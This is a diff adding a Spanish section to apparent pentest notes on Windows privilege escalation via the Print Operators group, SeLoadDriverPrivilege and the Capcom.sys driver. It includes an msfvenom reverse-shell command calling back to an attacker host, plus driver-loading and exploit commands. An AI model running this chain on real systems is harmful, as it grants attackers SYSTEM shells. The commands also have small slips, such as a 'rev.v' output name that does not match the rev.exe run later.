@@ -2050,6 +2050,68 @@ Interpretación de la salida
 - Esta información puede ser crucial para el análisis de seguridad, ya que revela la actividad del usuario relacionada con los recursos compartidos de la red, lo que potencialmente podría indicar acceso no autorizado o uso indebido de credenciales.
 
 ##### Print Operators
+
+El grupo **Print Opertaros** en Windows está destinado a usuarios que necesitan gestionar impresoras y trabajos de impresión. Los miembros de este grupo pueden realizar tareas como configurar impresoras, administrar colas de impresión y ejecutar funciones relacionadas con el servidor de impresión. Aunque estos permisos están enfocados en tareas de impresión, en determinadas circunstancias podrían ser explotados para escalar privilegios en un sistema Windows.
+
+###### Escalada de Privilegios a través del Grupo de Operadores de Impresión y el Controlador Capcom.sys
+
+El grupo **Print Operators** es un grupo con privilegios elevados en Windows que otorga a sus miembros permisos significativos, entre los que se incluyen:
+
+- **SeLoadDriverPrivilege**: Permite a los miembros cargar y gestionar controladores del sistema.
+
+- **Gestión de impresoras**: Capacidad para crear, compartir, administrar y eliminar impresoras conectadas a un controlador de dominio.
+
+- **Acceso local a controladores de dominio**: Los miembros pueden iniciar sesión localmente en un controlador de dominio y apagarlo.
+
+Estos privilegios permiten a los miembros del grupo cargar controladores del sistema, lo que puede ser explotado para realizar acciones con mayores privilegios en el sistema.
+
+###### Uso de Capcom.sys para la Escalada de Privilegios
+
+El controlador `Capcom.sys` es un controlador conocido que permite ejecutar código con privilegios de sistema. Este controlador puede ser utilizado para escalar privilegios en un entorno Windows. A continuación, se describe el proceso:
+
+1. **Descargar el Controlador Capcom.sys**
+
+    El controlador `Capcom.sys` puede descargarse desde el siguiente repositorio de GitHub:
+
+    [Capcom-Rootkit - Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
+
+    Además, se pueden encontrar herramientas útiles como `LoadDriver.exe` y `ExploitCapcom.exe` en el siguiente repositorio:
+
+    [SeLoadDriverPrivilege - Josh Morrison](https://github.com/JoshMorrison99/SeLoadDriverPrivilege)
+
+2. **Crear un Ejecutable Malicioso**
+
+    Utilizando Metasploit, creamos un ejecutable malicioso (por ejemplo, rev.exe) que proporcione un reverse shell al ejecutarse. Este ejecutable se ejecutará con privilegios elevados una vez que se cargue el controlador `Capcom.sys`.
+
+    ```bash
+    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.5 LPORT=4444 -f exe > rev.v
+    ```
+
+3. **Cargar el Controlador Capcom.sys**
+
+    - Utilizamos la herramienta `LoadDriver.exe` para cargar el controlador `Capcom.sys`. El comando a ejecutar es el siguiente:
+
+    ```powershell
+    .\LoadDriver.exe System\CurrentControlSet\MyService C:\Users\Test\Capcom.sys
+    ```
+
+    - Si la ejecución es exitosa, el comando debería devolver:
+
+    ```powershell
+    NTSTATUS: 00000000, WinError: 0
+    ```
+
+    - Si no es así, verifique la ubicación de Capcom.sys y asegúrese de que está ejecutando `LoadDriver.exe` desde el directorio correcto.
+
+4. **Ejecutar el Ejecutable Malicioso**
+
+    - Una vez cargado el controlador, utilizamos `ExploitCapcom.exe` para ejecutar el ejecutable malicioso con privilegios elevados:
+ 
+    ```powershell
+    .\ExploitCapcom.exe C:\Windows\Place\to\reverseshell\rev.exe
+    ```
+    - Este comando ejecutará el archivo rev.exe con privilegios de sistema, proporcionando al atacante un reverse shell.
+
 ##### SeTakeOwnershipPrivilege
 
 ###  9.2. <a name='linux-2'></a>Linux
